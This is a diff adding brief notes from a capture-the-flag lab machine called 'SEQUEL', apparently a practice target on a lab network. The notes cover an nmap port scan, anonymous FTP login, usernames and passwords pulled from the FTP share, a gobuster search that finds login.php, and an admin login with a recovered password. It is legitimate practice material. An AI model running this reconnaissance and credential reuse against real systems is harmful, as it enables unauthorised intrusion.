@@ -1,0 +1,35 @@
+SEQUEL:
+----------------
+
+ftp - http - 21 - 80
+
+1- nmap:
+----------------
+sudo nmap -p- --open -sS -vvv --min-rate 5000 -vvv -n -Pn 10.129.14.110 -oG nmap.txt -> ports
+-
+nmap -sC -sV 10.129.14.110 -> version 
+
+2- ftp user anonymous:
+----------------
+	- ftp anonymous@10.129.129.94
+	- ftp 10.129.129.94
+		Name: anonymous
+	230 login sucessful :)
+	
+2- ftp get files:
+----------------
+	get users : aron pwnmeow egotisticalsw admin
+	get passwds: root Supersecretpassword1 @BaASD&9032123sADS rKXM59ESxesUFHAd
+
+3- gobuster:
+----------------
+	find .php in web: gobuster dir -u http://10.129.129.94 -w /usr/share/dirb/wordlists/common.txt -x .php
+	
+	found login.php
+	
+3- http://10.129.129.94/login.php:
+----------------
+	user: admin
+	password: rKXM59ESxesUFHAd
+	
+
